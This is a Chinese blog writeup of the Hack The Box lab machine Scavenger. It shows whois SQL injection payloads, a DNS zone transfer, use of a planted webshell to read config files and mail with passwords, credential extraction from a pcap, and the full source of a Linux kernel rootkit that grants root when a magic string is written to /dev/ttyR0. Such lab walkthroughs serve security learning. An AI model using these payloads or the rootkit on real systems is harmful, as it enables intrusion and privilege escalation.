@@ -1,0 +1,356 @@
+<!doctype html><html lang=zh-cn><title>Hackthebox - Scavenger - 10.10.10.155 - Writeup - imlonghao</title><meta name=description content="Hack The Box - Scavenger 解题过程及思路 Writeup"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=renderer content="webkit"><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><link rel=dns-prefetch href=//vip1.loli.net><link rel=stylesheet href=/static/hw3x7x.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqusjs.css integrity="sha256-GxdCIOyfxQ1OBfS99qAIJDoGK1ADuBsxhMTqXG82fAY=" crossorigin=anonymous><script src=/static/hw3x7x.js async></script><script src=https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqus.js integrity="sha256-LVaMHPQ2zLqOc5rXSAfr4d1PIkEGNLyyUTDNPZmTtUw=" crossorigin=anonymous></script><script src=//instant.page/3.0.0 type=module defer integrity=sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1></script><link rel=alternate type=application/rss+xml title="imlonghao Feed" href=https://imlonghao.com/feed.xml><div id=container><div id=header><div id=post-nav><a href=./>Home</a>
+&nbsp;»&nbsp;
+<a href=./57.html>Hackthebox - Scavenger - 10.10.10.155 - Writeup</a></div></div><div class=clearfix></div><div id=title>Hackthebox - Scavenger - 10.10.10.155 - Writeup</div><div id=content class=markdown-body><p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/UswAYt8R5zBSTJi.png><h2>信息收集</h2><p><img class=lazy data-src=https://vip1.loli.net/2020/02/23/P1OoYqxJsS29avy.png><h2>Whois 服务器 SQL 注入</h2><p>一开始刚拿到机器时，80 端口看了下用 IP 直接打开没有网站，FTP 21 端口也需要用户名密码才能登陆，都无果后，来看下他 43 端口的 whois 服务器。<p>whois 服务器一般是用来查询域名 whois 信息的，查询域名的注册商、注册时间等信息，随便输入一个试试<p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/AjHd5LpJXRErSx2.png><p>这里就给了我们两个信息：<ol><li>whois 服务器后端数据库是 <code>MariaDB 10.1.37</code><li>给了我们一个域名 <code>supersechosting.htb</code></ol><p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/CS7XGxh5W8cmBRM.png><p>用他给的 <code>supersechosting.htb</code> 域名进行查询能正常出结果，上面给的信息也说了，后端是 MariaDB 数据库，那么会不会有 SQL 注入呢？<p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/b4hJFcYUwLfTZpV.png><p>在查询域名的后面加上了一个单引号，得到了一个在 web 上常见的数据库报错！那么就进行手工注入，列出所有的域名<pre><code>whois -h 10.10.10.155 SUPERSECHOSTING.HTB\'\)or\ 1=1\#
+</code></pre><p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/2wI1GeL4ru6Kp3k.png><p>通过该条查询，得到了以下域名<ul><li>SUPERSECHOSTING.HTB<li>JUSTANOTHERBLOG.HTB<li>PWNHATS.HTB<li>RENTAHACKER.HTB</ul><p>接下来随意查了一下数据库基本信息、数据库表以及数据库用户等信息备用<pre><code>whois -h 10.10.10.155 &quot;') union select user(),2#&quot;
+whois@localhost
+
+whois -h 10.10.10.155 &quot;') union select database(),2#&quot;
+whois
+
+whois -h 10.10.10.155 &quot;') union select (select group_concat(schema_name) from information_schema.schemata),2#&quot;
+information_schema,whois
+
+whois -h 10.10.10.155 &quot;') union select (select group_concat(table_name) from information_schema.tables where table_schema='whois'),2#&quot;
+customers
+</code></pre><h2>DNS 域传送漏洞 AXFR</h2><p>DNS 域传送漏洞可以算得上是一个比较古老的漏洞了，如今大多数 DNS 服务器都不会犯这低级的错误<p>不了解 DNS 域传送漏洞的可以参考先知上的这篇文章，<a href=https://xz.aliyun.com/t/6617 rel=nofollow>深入了解子域名挖掘tricks</a><p>通过该漏洞我们可以获得一个域名全部的解析记录，可以拿到子域名记录，对接下来的测试非常有帮助<p>攻击的命令也非常简单，只需要使用 <code>dig</code> 命令即可：<pre><code>dig @10.10.10.155 supersechosting.htb axfr
+</code></pre><p>依次对上一步收集到的四个域名进行攻击，拿到所有的解析记录，后续再慢慢进行使用<pre><code>rentahacker.htb.        604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800
+rentahacker.htb.        604800  IN      NS      ns1.supersechosting.htb.
+rentahacker.htb.        604800  IN      MX      10 mail1.rentahacker.htb.
+rentahacker.htb.        604800  IN      A       10.10.10.155
+mail1.rentahacker.htb.  604800  IN      A       10.10.10.155
+sec03.rentahacker.htb.  604800  IN      A       10.10.10.155
+www.rentahacker.htb.    604800  IN      A       10.10.10.155
+rentahacker.htb.        604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800
+
+supersechosting.htb.    604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 3 604800 86400 2419200 604800
+supersechosting.htb.    604800  IN      NS      ns1.supersechosting.htb.
+supersechosting.htb.    604800  IN      MX      10 mail1.supersechosting.htb.
+supersechosting.htb.    604800  IN      A       10.10.10.155
+ftp.supersechosting.htb. 604800 IN      A       10.10.10.155
+mail1.supersechosting.htb. 604800 IN    A       10.10.10.155
+ns1.supersechosting.htb. 604800 IN      A       10.10.10.155
+whois.supersechosting.htb. 604800 IN    A       10.10.10.155
+www.supersechosting.htb. 604800 IN      A       10.10.10.155
+supersechosting.htb.    604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 3 604800 86400 2419200 604800
+
+justanotherblog.htb.    604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 5 604800 86400 2419200 604800
+justanotherblog.htb.    604800  IN      NS      ns1.supersechosting.htb.
+justanotherblog.htb.    604800  IN      MX      10 mail1.justanotherblog.htb.
+justanotherblog.htb.    604800  IN      A       10.10.10.155
+mail1.justanotherblog.htb. 604800 IN    A       10.10.10.155
+www.justanotherblog.htb. 604800 IN      A       10.10.10.155
+justanotherblog.htb.    604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 5 604800 86400 2419200 604800
+
+pwnhats.htb.            604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 5 604800 86400 2419200 604800
+pwnhats.htb.            604800  IN      NS      ns1.supersechosting.htb.
+pwnhats.htb.            604800  IN      MX      10 mail1.pwnhats.htb.
+pwnhats.htb.            604800  IN      A       10.10.10.155
+mail1.pwnhats.htb.      604800  IN      A       10.10.10.155
+www.pwnhats.htb.        604800  IN      A       10.10.10.155
+pwnhats.htb.            604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 5 604800 86400 2419200 604800
+</code></pre><h2>Web - www.rentahacker.htb</h2><p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/eAsRrFzTUPpfn1l.png><p>一个 Wordpress 的博客，看上去是提供黑客租赁服务的<p>跑了跑没发现什么漏洞<p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/LCa9GReQXg7Yvqp.png><p>首页关注到有几条评论，可以去看一看<p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/WoBOFJlLR6mruDZ.png><p>看到有一个署名为「31173 HAXXOR team」的人发了一条评论，说管理员你被黑了，让去看一下「bug tracker」<p>那么很明显我们就要找到这个「bug tracker」，看看有什么发现<h2>Web - www.supersechosting.htb</h2><p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/2vNjcGRHzSh431M.png><p>这个网站大概可以理解成是一个虚拟空间提供商的首页，告诉了我们一些信息<ul><li>服务器提供 PHP 与 MySQL 环境<li>可以通过 ssh 以及 ftp 管理到网站<li>提供 dns 以及 whois 接口（这些我们已经用到了）<li>提供 <code>.htb</code> 域名注册，仅需 $4.95 每年（太贵了）</ul><p>扫了一扫目录没有发现什么异常和值得关注的信息<pre><code>/plugins (Status: 301)
+/themes (Status: 301)
+/content (Status: 301)
+/assets (Status: 301)
+/config (Status: 301)
+/javascript (Status: 301)
+/index (Status: 200)
+/phpmyadmin (Status: 403)
+/manual (Status: 301)
+/vendor (Status: 301)
+/0 (Status: 200)
+/server-status (Status: 403)
+/index.php (Status: 200)
+/wp-forum.phps (Status: 403)
+</code></pre><h2>Web - www.justanotherblog.htb</h2><p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/P6rZQNhvbHX7udo.png><p>看起来是一个还没有使用的网站，扫了一下放弃了，应该没有什么重要的东西<h2>Web - sec03.rentahacker.htb</h2><p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/jm7d1OQ2JvXknqG.png><p>网站被挂了一个黑页，ID 和在博客留言的一致，这个网站应该就是之前说的那个被黑的「bug tracker」了<pre><code>/login.php (Status: 200)
+/index.php (Status: 302)
+/search.php (Status: 302)
+/index.html (Status: 200)
+/.htaccess (Status: 403)
+/view.php (Status: 200)
+/signup.php (Status: 200)
+/. (Status: 200)
+/.html (Status: 403)
+/.php (Status: 403)
+/verify.php (Status: 200)
+/.htpasswd (Status: 403)
+/plugin.php (Status: 200)
+/.htm (Status: 403)
+/.htpasswds (Status: 403)
+/account_delete.php (Status: 200)
+/.htgroup (Status: 403)
+/core.php (Status: 200)
+/wp-forum.phps (Status: 403)
+/wiki.php (Status: 200)
+/.htaccess.bak (Status: 403)
+/bug_report.php (Status: 200)
+/main_page.php (Status: 302)
+/shell.php (Status: 200)
+/.htuser (Status: 403)
+/login_page.php (Status: 200)
+/news_rss.php (Status: 302)
+/.htc (Status: 403)
+/.ht (Status: 403)
+</code></pre><p>扫了一下目录，随便访问了返回 200 的页面，可以知道这个域名下部署的是<p><code>MantisBT Bug Tracker</code><p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/krvd45W2DxiRPbI.png><p>另外需要注意的是，有一个 <code>shell.php</code> 文件也返回了 200 状态码，目测可以执行命令<pre><code>$ wfuzz -w /usr/share/wordlists/seclists-git/Discovery/Web-Content/raft-medium-words-lowercase.txt &quot;http://sec03.rentahacker.htb/shell.php?FUZZ=ls&quot;
+000000868:   200        0 L      0 W      0 Ch        &quot;goods_script&quot;                                                                                                                                                               
+000000869:   200        225 L    225 W    4907 Ch     &quot;hidden&quot;                                                                                                                                                                     
+000000871:   200        0 L      0 W      0 Ch        &quot;postinfo&quot;
+</code></pre><p>Fuzz 了一下，果然是 webshell，密码是 <code>hidden</code>，这样就可以执行命令了，探测一下基本情况<pre><code>view-source:http://sec03.rentahacker.htb/shell.php?hidden=ls%20-al%20../../
+total 32
+drwxr-xr-x  8 root    root      4096 Dec  7  2018 .
+drwxr-xr-x 22 root    root      4096 Dec  4  2018 ..
+drwx------  4 ib01c01 customers 4096 Feb  1  2019 ib01c01
+drwx------  3 ib01c02 customers 4096 Dec 11  2018 ib01c02
+drwx------  4 ib01c03 customers 4096 Jan 30  2019 ib01c03
+dr-xrwx---  3 ib01ftp support   4096 Dec 10  2018 ib01ftp
+drwx------  3 ib01www support   4096 Dec 10  2018 ib01www
+drwx------  2 support support   4096 Feb  2  2019 support
+
+view-source:http://sec03.rentahacker.htb/shell.php?hidden=id
+uid=1003(ib01c03) gid=1004(customers) groups=1004(customers)
+
+view-source:http://sec03.rentahacker.htb/shell.php?hidden=cat%20config/config_inc.php
+&lt;?php
+$g_hostname               = 'localhost';
+$g_db_type                = 'mysqli';
+$g_database_name          = 'ib01c03';
+$g_db_username            = 'ib01c03';
+$g_db_password            = 'Thi$sh1tIsN0tGut';
+$g_default_timezone       = 'Europe/Berlin';
+$g_crypto_master_salt     = 'DCD4OIydnPefp27q8Bu5TJHE2RfyO4Zit13B6zLfJdQ=';
+</code></pre><p>这里拿到了一组数据库的用户名和密码：<code>ib01c03 - Thi$sh1tIsN0tGut</code><p>在测试的过程中，发现机器不能主动连接到我们攻击机的端口上，应该是有 iptables 限制了外连，就只能用这个 webshell 操作了<p>继续看看有没有什么有用的信息，看到 <code>/var/mail/ib01c03</code> 有邮件<pre><code>view-source:http://sec03.rentahacker.htb/shell.php?hidden=cat%20/var/mail/ib01c03
+
+From support@ib01.supersechosting.htb Mon Dec 10 21:10:56 2018
+Return-path: &lt;support@ib01.supersechosting.htb&gt;
+Envelope-to: ib01c03@ib01.supersechosting.htb
+Delivery-date: Mon, 10 Dec 2018 21:10:56 +0100
+Received: from support by ib01.supersechosting.htb with local (Exim 4.89)
+	(envelope-from &lt;support@ib01.supersechosting.htb&gt;)
+	id 1gWRtI-0000ZK-8Q
+	for ib01c03@ib01.supersechosting.htb; Mon, 10 Dec 2018 21:10:56 +0100
+To: &lt;ib01c03@ib01.supersechosting.htb&gt;
+Subject: Re: Please help! Site Defaced!
+In-Reply-To: Your message of Mon, 10 Dec 2018 21:04:49 +0100
+	&lt;E1gWRnN-0000XA-44@ib01.supersechosting.htb&gt;
+References: &lt;E1gWRnN-0000XA-44@ib01.supersechosting.htb&gt;
+X-Mailer: mail (GNU Mailutils 3.1.1)
+Message-Id: &lt;E1gWRtI-0000ZK-8Q@ib01.supersechosting.htb&gt;
+From: support &lt;support@ib01.supersechosting.htb&gt;
+Date: Mon, 10 Dec 2018 21:10:56 +0100
+X-IMAPbase: 1544472964 2
+Status: O
+X-UID: 1
+
+&gt;&gt; Please we need your help. Our site has been defaced!
+&gt;&gt; What we should do now?
+&gt;&gt;
+&gt;&gt; rentahacker.htb
+
+Hi, we will check when possible. We are working on another incident right now. We just make a backup of the apache logs.
+Please check if there is any strange file in your web root and upload it to the ftp server:
+ftp.supersechosting.htb
+user: ib01ftp
+pass: YhgRt56_Ta
+
+Thanks.
+</code></pre><p>拿到了一组 FTP 的用户名和密码：<code>ib01ftp - YhgRt56_Ta</code><p>另外根据邮件的内容，应该是网站站长发现被黑了之后联系系统管理员调查，系统管理员抓取了相关日志放在了 FTP 上面<h2>FTP - ib01ftp</h2><p>使用上一步拿到的 FTP 用户名和密码登陆，FTP 目录结构大致如下<pre><code>.
+└── incidents
+    ├── ib01c01
+    │   ├── ib01c01.access.log
+    │   ├── ib01c01_incident.pcap
+    │   └── notes.txt
+    └── ib01c03
+
+3 directories, 3 files
+</code></pre><p>将全部文件拉下来本地进行分析<p>notes.txt，系统管理员说攻击者知道了有效的密码，成功登陆了系统进行了攻击<pre><code>After checking the logs and the network capture, all points to that the attacker knows valid credentials and abused a recently discovered vuln to gain access to the server!
+</code></pre><p>ib01c01.access.log，告诉了我们后台的路径：<code>http://www.pwnhats.htb/admin530o6uisg/</code><pre><code>10.0.2.19 - - [10/Dec/2018:21:51:00 +0100] &quot;GET /admin530o6uisg/index.php?controller=AdminLogin&amp;token=de267fd50b09d00b04cca76ff620b201 HTTP/1.1&quot; 200 2787 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;
+10.0.2.19 - - [10/Dec/2018:21:51:00 +0100] &quot;GET /admin530o6uisg/themes/default/css/overrides.css HTTP/1.1&quot; 200 555 &quot;http://www.pwnhats.htb/admin530o6uisg/index.php?controller=AdminLogin&amp;token=de267fd50b09d00b04cca76ff620b201&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;
+...
+</code></pre><h2>流量包分析</h2><p>ib01c01_incident.pcap，分析流量包，从中我们应该能找到后台的用户名和密码<p>使用以下过滤器，主要关注 POST 请求，因为登陆和执行等比较重要操作都是以 POST 来进行交互的<pre><code>http.request.method == &quot;POST&quot;
+</code></pre><p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/DRwjlASNZPYqUFu.png><p>从前两条记录中提取到了两组用户名和密码：<p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/FMK5DU4CeXraLnB.png><p>（登陆失败）<p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/T7dul8NPvSnYMZc.png><p>（登陆成功）<pre><code>admin@pwnhats.htb - pwnhats.htb - 登陆失败
+pwnhats@pwnhats.htb - GetYouAH4t! - 登陆成功
+</code></pre><p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/nSLlPehvbAkN9Cs.png><p>从第三个 POST 请求能看出来这个 web 系统大概的漏洞利用点在哪<p>另外继续分析这个流量包，从 <code>tcp.stream eq 27</code> 看上去攻击者试图去编译一个内核模块<p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/H1T8UO5LsMXtBQR.png><p>继续往下看，从 <code>tcp.stream eq 28</code> 看到了这个内核模块的源码<p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/WGjsZcMxbEPtYdl.png><pre><code class=language-c>#include &lt;linux/init.h&gt;   
+#include &lt;linux/module.h&gt; 
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/device.h&gt;
+#include &lt;linux/fs.h&gt;    
+#include &lt;asm/uaccess.h&gt;
+#include &lt;linux/slab.h&gt;
+#include &lt;linux/syscalls.h&gt;
+#include &lt;linux/types.h&gt;
+#include &lt;linux/cdev.h&gt;
+#include &lt;linux/cred.h&gt;
+#include &lt;linux/version.h&gt;
+
+#define  DEVICE_NAME &quot;ttyR0&quot; 
+#define  CLASS_NAME  &quot;ttyR&quot;
+
+#if LINUX_VERSION_CODE &gt; KERNEL_VERSION(3,4,0)
+#define V(x) x.val
+#else
+#define V(x) x
+#endif
+
+// Prototypes
+static int     __init root_init(void);
+static void    __exit root_exit(void);
+static int     root_open  (struct inode *inode, struct file *f);
+static ssize_t root_read  (struct file *f, char *buf, size_t len, loff_t *off);
+static ssize_t root_write (struct file *f, const char __user *buf, size_t len, loff_t *off);
+
+// Module info
+MODULE_LICENSE(&quot;GPL&quot;); 
+MODULE_AUTHOR(&quot;pico&quot;);
+MODULE_DESCRIPTION(&quot;Got r00t!.&quot;); 
+MODULE_VERSION(&quot;0.1&quot;); 
+
+static int            majorNumber; 
+static struct class*  rootcharClass  = NULL;
+static struct device* rootcharDevice = NULL;
+
+static struct file_operations fops =
+{
+  .owner = THIS_MODULE,
+  .open = root_open,
+  .read = root_read,
+  .write = root_write,
+};
+
+static int
+root_open (struct inode *inode, struct file *f)
+{
+   return 0;
+}
+
+static ssize_t
+root_read (struct file *f, char *buf, size_t len, loff_t *off)
+{
+  return len;
+}
+
+static ssize_t
+root_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
+{ 
+  char   *data;
+  char   magic[] = &quot;g0tR0ot&quot;;
+
+  struct cred *new_cred;
+  
+  data = (char *) kmalloc (len + 1, GFP_KERNEL);
+    
+  if (data)
+    {
+      copy_from_user (data, buf, len);
+        if (memcmp(data, magic, 7) == 0)
+	  {
+	    if ((new_cred = prepare_creds ()) == NULL)
+	      {
+		return 0;
+	      }
+	    V(new_cred-&gt;uid) = V(new_cred-&gt;gid) =  0;
+	    V(new_cred-&gt;euid) = V(new_cred-&gt;egid) = 0;
+	    V(new_cred-&gt;suid) = V(new_cred-&gt;sgid) = 0;
+	    V(new_cred-&gt;fsuid) = V(new_cred-&gt;fsgid) = 0;
+	    commit_creds (new_cred);
+	  }
+        kfree(data);
+      }
+    
+    return len;
+}
+
+
+static int __init
+root_init(void)
+{
+  // Create char device
+  if ((majorNumber = register_chrdev(0, DEVICE_NAME, &amp;fops)) &lt; 0)
+    {
+      return majorNumber;
+    }
+ 
+   // Register the device class
+   rootcharClass = class_create(THIS_MODULE, CLASS_NAME);
+   if (IS_ERR(rootcharClass))
+     {
+       unregister_chrdev(majorNumber, DEVICE_NAME);
+       return PTR_ERR(rootcharClass); 
+   }
+ 
+   // Register the device driver
+   rootcharDevice = device_create(rootcharClass, NULL,
+				  MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
+   if (IS_ERR(rootcharDevice))
+     {
+       class_destroy(rootcharClass);
+       unregister_chrdev(majorNumber, DEVICE_NAME);
+       return PTR_ERR(rootcharDevice);
+     }
+
+    return 0;    
+}
+
+static void __exit
+root_exit(void) 
+{
+  // Destroy the device
+  device_destroy(rootcharClass, MKDEV(majorNumber, 0));
+  class_unregister(rootcharClass);                     
+  class_destroy(rootcharClass);                        
+  unregister_chrdev(majorNumber, DEVICE_NAME);     
+}
+
+
+module_init(root_init);
+module_exit(root_exit);
+</code></pre><p>在谷歌搜索了一下 <code>Got r00t!.</code> 这个关键字，看到了这篇文章：<a href=https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485 rel=nofollow>Kernel RootKits. Getting your hands dirty - Malware - 0x00sec - The Home of the Hacker</a><p>大概知道了这个程序是一个内核后门，使用方法如下：<pre><code>$ id
+uid=1000(pico) gid=1000(pico) groups=1000(pico)
+$ echo &quot;g0tR0ot&quot; &gt; /dev/ttyR0
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><p>通过 webshell 查看 <code>/dev/ttyR0</code> 文件存在<p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/9YaxBDJw17qRZFh.png><p>尝试提权<p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/KRWOcFBU9eVs2ED.png><p>失败了&mldr;想了想毕竟我们现在连 user.txt 都没拿到，怎么可能那么快就拿到 root.txt<h2>Web - www.pwnhats.htb</h2><p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/JHd9SqCYXWFE64T.png><p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/HUATDrJh9u7lYQ1.png><p>该网站部署的是一个商城程序，根据页脚的提示可以知道是：<code>PrestaShop</code><p>上面已经拿到了后台地址和密码，直接登陆看看<pre><code>http://www.pwnhats.htb/admin530o6uisg/index.php
+pwnhats@pwnhats.htb
+GetYouAH4t!
+</code></pre><p>（后台太太太太太太太卡了直接放弃登陆的想法）<h2>FTP - ib01c01</h2><p>上面我们知道网站提供 FTP 功能，并且也知道了 ib01c01 对应网站的管理员密码是 <code>GetYouAH4t!</code>，那么有没有可能这个密码也是 ftp 的密码呢？<p>尝试使用 <code>ib01c01 - GetYouAH4t!</code> 登陆 FTP 帐号<p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/tVp64dgJ27BXbfy.png><p>成功了，并且也看到了我们所需要的 user.txt 文件<p>在查看目录的时候，我加上了 <code>-a</code> 列出所有文件，发现了一个奇怪的目录<p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/Q7yZYbjcwMqT9hf.png><p>发现了 <code>/home/ib01c01/.../</code> 目录，这很明显是一个故意隐藏的目录<p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/wHqtrU5OVfaL9B1.png><p>进入后发现了内核后门模块<h2>Kernel - root.ko</h2><p>上面我们尝试了一次使用这个内核后门，但是失败了，原因可能是攻击者在编译之前修改了密码<p>将 <code>root.ko</code> 拉到本地，打开老女人（IDA）查看代码<p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/AK9ToCD2gJ1dwE6.png><p>可以看到程序对 magic 的值进行了多次的修改，（目的就是绕晕我们）<p>最终的 magic 的值应该是 <code>g3tPr1v</code>，内核后门的利用方法就变成了：<pre><code>echo &quot;g3tPr1v&quot; &gt; /dev/ttyR0
+</code></pre><p>觉得上面 IDA 截图思路不清晰的同学可以编译下面的程序进行测试，看看最终究竟是什么～<pre><code>#include&lt;stdio.h&gt;
+
+void main() {
+  char a[4];
+  char b[5];
+  char magic[8];
+  strcpy(a, &quot;g3t&quot;);
+  strcpy(b, &quot;Pr1v&quot;);
+  strcpy(magic, &quot;g0tR0ot&quot;);
+  snprintf(magic, 8 uLL, &quot;%s%s&quot;, a, b);
+  printf(&quot;%s&quot;, magic);
+}
+</code></pre><h2>Root</h2><p>回到一开始的 webshell，加持现在的内核后门，拿到 root 就不是一件难事，运行：<pre><code>id;echo &quot;g3tPr1v&quot; &gt; /dev/ttyR0;id
+</code></pre><p><img class=lazy data-src=https://vip1.loli.net/2020/05/24/zSmDlvBOIhF7irZ.png><p>root 权限到手！<h2>番外 - 为什么反弹不了 shell</h2><p>有 root 权限之后我通过 <code>iptables-save</code> 拉了一下 iptables 规则<pre><code># Generated by iptables-save v1.6.0 on Sun May 24 17:36:37 2020
+*filter
+:INPUT DROP [0:0]
+:FORWARD ACCEPT [0:0]
+:OUTPUT DROP [0:0]
+-A INPUT -p icmp -j ACCEPT
+-A INPUT -p udp -m udp --sport 53 -m u32 --u32 &quot;0x1e=0x81000000:0x81ffffff&quot; -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 20 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 21 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 25 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 43 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 53 -j ACCEPT
+-A INPUT -p udp -m udp --dport 53 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
+-A INPUT -i lo -j ACCEPT
+-A INPUT -j REJECT --reject-with icmp-port-unreachable
+-A OUTPUT -p icmp -j ACCEPT
+-A OUTPUT -p udp -m udp --dport 53 -m u32 --u32 &quot;0x1e=0x1000000:0x1ffffff&quot; -j ACCEPT
+-A OUTPUT -p tcp -m tcp --sport 20 -j ACCEPT
+-A OUTPUT -o lo -j ACCEPT
+-A OUTPUT -p tcp -m state --state ESTABLISHED -j ACCEPT
+-A OUTPUT -p udp -m state --state ESTABLISHED -j ACCEPT
+-A OUTPUT -j REJECT --reject-with icmp-port-unreachable
+COMMIT
+# Completed on Sun May 24 17:36:37 2020
+
+</code></pre><p>OUTPUT 链默认策略是 DROP 的，然后基本上就没设置什么允许主动发起出站的规则，这就是我们反弹 shell 反弹不了的原因</div></div><div id=disqus_thread></div><div id=footer><span>Copyright © 2015 - 2020 imlonghao. Theme by
+<a href=http://simiki.org/ target=_blank rel="noopener noreferrer">Simiki</a>. CC BY-NC-SA 4.0</span></div><script src=https://cdn.jsdelivr.net/npm/cfga@1.0.3/cfga.min.js integrity="sha256-TXHTTKAPRQ9mgacgN+couk0xnzQ6uOXTZ5ojH1q6GUk=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/vanilla-lazyload@12.3.0/dist/lazyload.min.js integrity="sha256-bojBIKfs4l2WDcJODncBIGEe5fhU7/sM3zRO5/f2nqE=" crossorigin=anonymous async></script>
